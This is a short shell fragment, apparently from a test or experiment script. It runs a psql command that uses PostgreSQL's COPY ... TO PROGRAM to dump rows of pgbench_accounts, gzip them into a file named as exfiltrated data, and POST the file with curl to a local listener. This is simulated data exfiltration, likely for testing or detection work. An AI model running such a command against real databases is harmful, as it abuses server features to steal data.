...
psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT * FROM pgbench_accounts LIMIT 500) TO PROGRAM 'sleep 30 && gzip > /tmp/accounts_exfil_c.gz && curl -s -X POST -d @/tmp/accounts_exfil_c.gz http://127.0.0.1:9090 > /dev/null 2>&1 || true';"
